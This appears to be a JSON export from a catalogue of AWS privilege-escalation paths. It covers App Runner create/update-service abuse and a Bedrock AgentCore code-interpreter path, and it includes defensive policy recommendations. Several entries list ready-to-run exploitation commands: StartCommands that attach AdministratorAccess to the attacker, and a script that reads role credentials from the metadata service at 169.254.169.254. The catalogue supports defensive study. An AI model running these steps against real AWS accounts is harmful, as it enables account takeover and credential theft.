[
  {
    "id": "apprunner-001",
    "name": "iam:PassRole + apprunner:CreateService",
    "category": "service-passrole",
    "services": [
      "iam",
      "apprunner"
    ],
    "description": "A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged IAM role attached. The service runs with the attached role's permissions, and the attacker has multiple ways to leverage these permissions. They can configure a StartCommand to execute AWS CLI commands when the service starts, deploy a container with a web shell or reverse shell to access the role's credentials via the container metadata service, or use a repository with an apprunner.yaml file containing malicious commands. This technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts tasks.apprunner.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts tasks.apprunner.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Verify your current identity and note your username for the next step"
        },
        {
          "step": 2,
          "command": "aws apprunner create-service \\\n  --service-name privesc-service \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"public.ecr.aws/aws-cli/aws-cli:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"8080\",\n        \"StartCommand\": \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\n      }\n    },\n    \"AutoDeploymentsEnabled\": false\n  }' \\\n  --instance-configuration '{\n    \"Cpu\": \"1 vCPU\",\n    \"Memory\": \"2 GB\",\n    \"InstanceRoleArn\": \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\"\n  }'\n",
          "description": "Create an App Runner service using the public AWS CLI image with a StartCommand that grants admin access to your user"
        },
        {
          "step": 3,
          "command": "aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'",
          "description": "Wait for the service to reach 'RUNNING' status (may take 3-5 minutes). The StartCommand executes when the service starts, attaching AdministratorAccess to your user."
        },
        {
          "step": 4,
          "command": "sleep 15",
          "description": "Wait 15 seconds for IAM policy changes to propagate"
        },
        {
          "step": 5,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrator access by listing IAM users (should now succeed)"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"apprunner.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `apprunner:CreateService` permissions to specific users/roles\n- Monitor CloudTrail for App Runner service creation with privileged roles\n- Alert on services using StartCommand to execute IAM, STS, or security-related commands\n- Use VPC configuration to isolate App Runner services\n- Implement container image scanning and signing\n- Only allow images from trusted ECR repositories (consider blocking public ECR if not needed)\n- Alert on App Runner services created with administrative roles\n- Use AWS Config to detect services with overly permissive roles\n",
    "discoveredBy": {
      "name": "Riyaz Walikar",
      "organization": "Appsecco",
      "date": "2021"
    },
    "references": [
      {
        "title": "Getting Shell and Data Access in AWS App Runner",
        "url": "https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77"
      },
      {
        "title": "HackTricks Cloud - AWS App Runner Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc"
      }
    ],
    "relatedPaths": [
      "apprunner-002",
      "lambda-001",
      "ec2-001"
    ],
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": false
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+apprunner-createservice",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole and apprunner:CreateService permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "apprunner_service",
          "label": "New App Runner Service",
          "type": "resource",
          "description": "New App Runner service created with a privileged IAM role attached. The service runs on AWS-managed infrastructure and automatically assumes the attached role. The attacker can configure the service in multiple ways to leverage the role's permissions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the Apprunner Service",
          "type": "resource",
          "description": "IAM role passed to the App Runner service as the instance role. The role must trust apprunner.amazonaws.com to assume it. When the App Runner service starts, it assumes this role and provides access to the role's permissions through various methods.\n"
        },
        {
          "id": "method_startcommand",
          "label": "Method 1: StartCommand",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure a StartCommand that executes when the service starts, running AWS CLI commands with the target role's credentials. The StartCommand can perform privileged actions such as:\n- Attaching AdministratorAccess policy to the starting principal\n- Creating new access keys for privileged users\n- Modifying IAM policies or trust relationships\n- Exfiltrating data from S3, secrets, or databases\n- Any AWS API action the target role has permissions for\n\nExample: `StartCommand: \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"`\n"
        },
        {
          "id": "method_webshell",
          "label": "Method 2: ECR Image with Web Shell",
          "type": "action",
          "color": "#99ccff",
          "description": "Deploy a container image (from ECR or public registry) containing a web shell or reverse shell. The container runs with the target role's permissions and can access the role's temporary credentials via the container metadata service at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.\n\nThe web shell provides an interface to:\n- Query the metadata service for temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)\n- Execute arbitrary commands within the container\n- Exfiltrate the credentials for use outside the container\n"
        },
        {
          "id": "method_apprunner_yaml",
          "label": "Method 3: Repository with apprunner.yaml",
          "type": "action",
          "color": "#99ccff",
          "description": "Point the App Runner service to a source code repository containing a malicious apprunner.yaml configuration file. The apprunner.yaml file can specify build and run commands that execute during the service deployment and startup, running with the target role's permissions.\n\nThe apprunner.yaml can include:\n- Pre-build commands that execute during image build\n- Post-build commands after the build completes\n- Start commands that run when the service starts\n- All commands execute with access to the target role's credentials via environment variables or metadata service\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "apprunner_service",
          "label": "iam:PassRole + apprunner:CreateService",
          "description": "Create a new App Runner service and pass the target role as the instance role. The service can be configured using multiple approaches (StartCommand, container image, or source repository).\n\nExample command (StartCommand approach):\n```bash\naws apprunner create-service \\\n  --service-name privesc-service \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"public.ecr.aws/aws-cli/aws-cli:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"8080\",\n        \"StartCommand\": \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\n      }\n    },\n    \"AutoDeploymentsEnabled\": false\n  }' \\\n  --instance-configuration '{\n    \"Cpu\": \"1 vCPU\",\n    \"Memory\": \"2 GB\",\n    \"InstanceRoleArn\": \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\"\n  }'\n```\n"
        },
        {
          "from": "apprunner_service",
          "to": "target_role",
          "label": "Service assumes role",
          "description": "The App Runner service automatically assumes the passed instance role when it starts. The service now has access to all permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "method_startcommand",
          "label": "Option A",
          "description": "Use the StartCommand configuration parameter to execute AWS CLI commands when the service starts. The command runs with the target role's credentials.\n"
        },
        {
          "from": "target_role",
          "to": "method_webshell",
          "label": "Option B",
          "description": "Deploy a container image containing a web shell or reverse shell. Access the role's credentials via the container metadata service.\n"
        },
        {
          "from": "target_role",
          "to": "method_apprunner_yaml",
          "label": "Option C",
          "description": "Configure the service to use a source code repository with a malicious apprunner.yaml file that specifies commands to execute during build and runtime.\n"
        },
        {
          "from": "method_startcommand",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "A1",
          "condition": "admin",
          "description": "The StartCommand executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access.\n"
        },
        {
          "from": "method_startcommand",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "A2",
          "condition": "some_permissions",
          "description": "The StartCommand executes with elevated permissions and can perform privileged actions within those permissions.\n"
        },
        {
          "from": "method_startcommand",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "A3",
          "condition": "no_permissions",
          "description": "The StartCommand has minimal permissions and provides limited value for privilege escalation.\n"
        },
        {
          "from": "method_webshell",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "B1",
          "condition": "admin",
          "description": "The web shell successfully exfiltrates credentials with AdministratorAccess permissions, granting full administrative access.\n"
        },
        {
          "from": "method_webshell",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "B2",
          "condition": "some_permissions",
          "description": "The web shell exfiltrates credentials with elevated permissions that can be used for data access or further escalation.\n"
        },
        {
          "from": "method_webshell",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "B3",
          "condition": "no_permissions",
          "description": "The exfiltrated credentials have minimal permissions and provide limited value.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "C1",
          "condition": "admin",
          "description": "The apprunner.yaml commands execute with AdministratorAccess permissions and successfully escalate privileges.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "C2",
          "condition": "some_permissions",
          "description": "The apprunner.yaml commands execute with elevated permissions and can perform privileged actions.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "C3",
          "condition": "no_permissions",
          "description": "The apprunner.yaml commands have minimal permissions and provide limited value.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "apprunner:CreateService",
          "resourceConstraints": "Must have permission to create App Runner services"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/apprunner/apprunner-001.yaml"
  },
  {
    "id": "apprunner-002",
    "name": "apprunner:UpdateService",
    "category": "access-resource",
    "services": [
      "apprunner"
    ],
    "description": "A principal with `apprunner:UpdateService` can modify an existing App Runner service's configuration. If the target service has a privileged IAM role attached, the attacker can update the service to leverage the attached role's permissions. They have multiple ways to exploit this, including configuring a StartCommand to execute AWS CLI commands when the service redeploys, updating to a container image with a web shell or reverse shell to access the role's credentials via the container metadata service, or pointing to a repository with a malicious apprunner.yaml file. This is similar to `lambda:UpdateFunctionCode` but for containerized applications. Unlike creating a new service, this doesn't require `iam:PassRole` since the role is already attached to the existing service.",
    "prerequisites": {
      "admin": [
        "An App Runner service must exist with an IAM role attached",
        "The service's role must have administrative permissions"
      ],
      "lateral": [
        "An App Runner service must exist with an IAM role attached"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws apprunner list-services",
          "description": "List existing App Runner services to find targets with privileged roles"
        },
        {
          "step": 2,
          "command": "aws apprunner describe-service --service-arn SERVICE_ARN",
          "description": "Check the service's instance role ARN to confirm elevated permissions and note the current port configuration"
        },
        {
          "step": 3,
          "command": "aws sts get-caller-identity",
          "description": "Verify your current identity and note your username for the next step"
        },
        {
          "step": 4,
          "command": "aws apprunner update-service \\\n  --service-arn SERVICE_ARN \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"public.ecr.aws/aws-cli/aws-cli:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"CURRENT_PORT\",\n        \"StartCommand\": \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\n      }\n    },\n    \"AutoDeploymentsEnabled\": false\n  }'\n",
          "description": "Update the service to use the public AWS CLI image with a StartCommand that grants admin access to your user"
        },
        {
          "step": 5,
          "command": "aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'",
          "description": "Wait for the service to complete redeployment and reach 'RUNNING' status (may take 3-5 minutes). The StartCommand executes when the service starts."
        },
        {
          "step": 6,
          "command": "sleep 15",
          "description": "Wait 15 seconds for IAM policy changes to propagate"
        },
        {
          "step": 7,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrator access by listing IAM users (should now succeed)"
        }
      ]
    },
    "recommendation": "Restrict the `apprunner:UpdateService` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"apprunner:UpdateService\",\n  \"Resource\": \"arn:aws:apprunner:REGION:ACCOUNT_ID:service/SpecificService/HASH\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateService` events on sensitive App Runner services\n- Alert on changes to StartCommand, especially those executing IAM, STS, or security-related commands\n- Implement container image scanning and require signed images\n- Only allow images from approved ECR repositories using conditions (consider blocking public ECR if not needed)\n- Alert on source configuration changes to services with privileged roles\n- Use AWS Config to detect unauthorized service updates\n- Implement deployment approvals for production services\n- Enable auto-deployments only from trusted source repositories\n",
    "discoveredBy": {
      "name": "Riyaz Walikar",
      "organization": "Appsecco",
      "date": "2021"
    },
    "references": [
      {
        "title": "Getting Shell and Data Access in AWS App Runner",
        "url": "https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77"
      },
      {
        "title": "HackTricks Cloud - AWS App Runner Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc"
      }
    ],
    "relatedPaths": [
      "apprunner-001",
      "lambda-003",
      "glue-002"
    ],
    "permissions": {
      "required": [
        {
          "permission": "apprunner:UpdateService",
          "resourceConstraints": "Target App Runner service must be in the Resource section"
        }
      ]
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/apprunner-updateservice",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with apprunner:UpdateService permission. Can be an IAM user or role. This principal can modify existing App Runner services to change their container image source.\n"
        },
        {
          "id": "target_service",
          "label": "Existing App Runner Service",
          "type": "resource",
          "description": "An existing App Runner service with an IAM role attached. The service runs containerized applications and can be reconfigured using multiple approaches to leverage the attached role's permissions. Unlike creating a new service, updating doesn't require iam:PassRole.\n"
        },
        {
          "id": "service_role",
          "label": "Existing Role That Trusts the Apprunner Service",
          "type": "resource",
          "description": "IAM role already attached to the App Runner service. The role trusts apprunner.amazonaws.com and was passed when the service was created. When the service is updated and redeploys, it continues to use this role and provides access to the role's permissions through various methods.\n"
        },
        {
          "id": "method_startcommand",
          "label": "Method 1: StartCommand",
          "type": "action",
          "color": "#99ccff",
          "description": "Update the service configuration to include a StartCommand that executes when the service redeploys, running AWS CLI commands with the service role's credentials. The StartCommand can perform privileged actions such as:\n- Attaching AdministratorAccess policy to the starting principal\n- Creating new access keys for privileged users\n- Modifying IAM policies or trust relationships\n- Exfiltrating data from S3, secrets, or databases\n- Any AWS API action the service role has permissions for\n\nExample: `StartCommand: \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"`\n"
        },
        {
          "id": "method_webshell",
          "label": "Method 2: ECR Image with Web Shell",
          "type": "action",
          "color": "#99ccff",
          "description": "Update the service to use a container image (from ECR or public registry) containing a web shell or reverse shell. The container runs with the service role's permissions and can access the role's temporary credentials via the container metadata service at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.\n\nThe web shell provides an interface to:\n- Query the metadata service for temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)\n- Execute arbitrary commands within the container\n- Exfiltrate the credentials for use outside the container\n"
        },
        {
          "id": "method_apprunner_yaml",
          "label": "Method 3: Repository with apprunner.yaml",
          "type": "action",
          "color": "#99ccff",
          "description": "Update the service to point to a source code repository containing a malicious apprunner.yaml configuration file. The apprunner.yaml file can specify build and run commands that execute during the service redeployment and startup, running with the service role's permissions.\n\nThe apprunner.yaml can include:\n- Pre-build commands that execute during image build\n- Post-build commands after the build completes\n- Start commands that run when the service starts\n- All commands execute with access to the service role's credentials via environment variables or metadata service\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The service role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The service role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The service role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_service",
          "label": "apprunner:UpdateService",
          "description": "Update the existing App Runner service's configuration. The service can be reconfigured using multiple approaches (StartCommand, container image, or source repository). Unlike creating a new service, this doesn't require iam:PassRole since the role is already attached.\n\nExample command (StartCommand approach):\n```bash\naws apprunner update-service \\\n  --service-arn SERVICE_ARN \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"public.ecr.aws/aws-cli/aws-cli:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"CURRENT_PORT\",\n        \"StartCommand\": \"iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\n      }\n    },\n    \"AutoDeploymentsEnabled\": false\n  }'\n```\n"
        },
        {
          "from": "target_service",
          "to": "service_role",
          "label": "Service uses existing role",
          "description": "The App Runner service redeploys with the updated configuration. The service continues to use its existing IAM role and has access to all permissions granted to this role.\n"
        },
        {
          "from": "service_role",
          "to": "method_startcommand",
          "label": "Option A",
          "description": "Update the service configuration to include a StartCommand that executes AWS CLI commands when the service redeploys. The command runs with the service role's credentials.\n"
        },
        {
          "from": "service_role",
          "to": "method_webshell",
          "label": "Option B",
          "description": "Update the service to use a container image containing a web shell or reverse shell. Access the role's credentials via the container metadata service.\n"
        },
        {
          "from": "service_role",
          "to": "method_apprunner_yaml",
          "label": "Option C",
          "description": "Update the service to use a source code repository with a malicious apprunner.yaml file that specifies commands to execute during build and runtime.\n"
        },
        {
          "from": "method_startcommand",
          "to": "admin",
          "label": "If service role has admin permissions",
          "branch": "A1",
          "condition": "admin",
          "description": "The StartCommand executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access.\n"
        },
        {
          "from": "method_startcommand",
          "to": "some_perms",
          "label": "If service role has some elevated permissions",
          "branch": "A2",
          "condition": "some_permissions",
          "description": "The StartCommand executes with elevated permissions and can perform privileged actions within those permissions.\n"
        },
        {
          "from": "method_startcommand",
          "to": "no_access",
          "label": "If service role has minimal permissions",
          "branch": "A3",
          "condition": "no_permissions",
          "description": "The StartCommand has minimal permissions and provides limited value for privilege escalation.\n"
        },
        {
          "from": "method_webshell",
          "to": "admin",
          "label": "If service role has admin permissions",
          "branch": "B1",
          "condition": "admin",
          "description": "The web shell successfully exfiltrates credentials with AdministratorAccess permissions, granting full administrative access.\n"
        },
        {
          "from": "method_webshell",
          "to": "some_perms",
          "label": "If service role has some elevated permissions",
          "branch": "B2",
          "condition": "some_permissions",
          "description": "The web shell exfiltrates credentials with elevated permissions that can be used for data access or further escalation.\n"
        },
        {
          "from": "method_webshell",
          "to": "no_access",
          "label": "If service role has minimal permissions",
          "branch": "B3",
          "condition": "no_permissions",
          "description": "The exfiltrated credentials have minimal permissions and provide limited value.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "admin",
          "label": "If service role has admin permissions",
          "branch": "C1",
          "condition": "admin",
          "description": "The apprunner.yaml commands execute with AdministratorAccess permissions and successfully escalate privileges.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "some_perms",
          "label": "If service role has some elevated permissions",
          "branch": "C2",
          "condition": "some_permissions",
          "description": "The apprunner.yaml commands execute with elevated permissions and can perform privileged actions.\n"
        },
        {
          "from": "method_apprunner_yaml",
          "to": "no_access",
          "label": "If service role has minimal permissions",
          "branch": "C3",
          "condition": "no_permissions",
          "description": "The apprunner.yaml commands have minimal permissions and provide limited value.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/apprunner/apprunner-002.yaml"
  },
  {
    "id": "bedrock-001",
    "name": "iam:PassRole + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
    "category": "service-passrole",
    "services": [
      "iam",
      "bedrock-agentcore"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "bedrock-agentcore:CreateCodeInterpreter",
          "resourceConstraints": "Must have permission to create Bedrock AgentCore code interpreters"
        },
        {
          "permission": "bedrock-agentcore:StartCodeInterpreterSession",
          "resourceConstraints": "Must have permission to start sessions with code interpreters"
        },
        {
          "permission": "bedrock-agentcore:InvokeCodeInterpreter",
          "resourceConstraints": "Must have permission to invoke code interpreters"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "bedrock-agentcore:GetCodeInterpreter",
          "resourceConstraints": "Can be help"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `bedrock-agentcore:CreateCodeInterpreter`, `bedrock-agentcore:StartCodeInterpreterSession`, and `bedrock-agentcore:InvokeCodeInterpreter` can create and invoke an AWS Bedrock AgentCore code interpreter with a privileged IAM execution role. Code interpreters run on Firecracker MicroVMs and can access the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS. By creating a code interpreter with a privileged role and invoking arbitrary Python code within it, an attacker can retrieve temporary credentials from the metadata service and gain the full permissions of the execution role.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "export AWS_REGION=[your region]\nexport EXECUTION_ROLE=[arn with admin privs]\nexport AWS_ACCESS_KEY_ID = [access key]\nexport AWS_SECRET_ACCESS_KEY = [secret access key]\nexport AWS_SESSION_TOKEN = [session token if applicable]\nwhich jq\n",
          "description": "Set up current session variables and confirm jq is installed"
        },
        {
          "step": 2,
          "command": "INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \\\n  --name privesc \\\n  --network-configuration '{\"networkMode\":\"SANDBOX\"}' \\\n  --execution-role-arn $EXECUTION_ROLE | jq -r .codeInterpreterId)\n",
          "description": "Create a code interpreter with the privileged execution role"
        },
        {
          "step": 3,
          "command": "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n    print(event['result']['structuredContent']['stdout'])\nEOF\n",
          "description": "Create the python file that will invoke the interpreter"
        },
        {
          "step": 4,
          "command": "CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
          "description": "Run the python file using the $INTERPRETER_ID to extract credentials"
        },
        {
          "step": 5,
          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
          "description": "Use the stolen credentials to assume the privileged role's permissions"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege and implement\nService Control Policies (SCPs) to prevent unauthorized code interpreter creation.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificBedrockRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Use SCPs to deny `bedrock-agentcore:CreateCodeInterpreter` org-wide if not needed\n- Restrict `bedrock-agentcore:InvokeCodeInterpreter` to specific code interpreters\n- Follow principle of least privilege for code interpreter execution roles\n- Ensure execution roles have equal or fewer privileges than invoking users\n- Enable CloudTrail Data Event logging for code interpreter invocations\n- Monitor for `CreateCodeInterpreter` and `InvokeCodeInterpreter` events\n- Alert on code interpreters created with administrative roles\n- Implement resource tags and condition keys to restrict code interpreter usage\n- Regularly audit execution roles attached to code interpreters\n",
    "discoveredBy": {
      "name": "Nigel Sood",
      "organization": "Sonrai Security",
      "date": "2025"
    },
    "references": [
      {
        "title": "AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling",
        "url": "https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/"
      },
      {
        "title": "Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters",
        "url": "https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/"
      },
      {
        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
      }
    ],
    "relatedPaths": [
      "bedrock-002",
      "lambda-001",
      "ec2-001",
      "sagemaker-001"
    ],
    "detectionTools": {
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L114-L118"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-codeinterpreter",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/hands-on-labs/lab/bedrock-agentcore-privilege-escalation-via-code-interpreters/",
        "scenarioPricingModel": "paid"
      }
    },
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": false
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole and bedrock-agentcore permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "code_interpreter",
          "label": "New Bedrock Code Interpreter",
          "type": "resource",
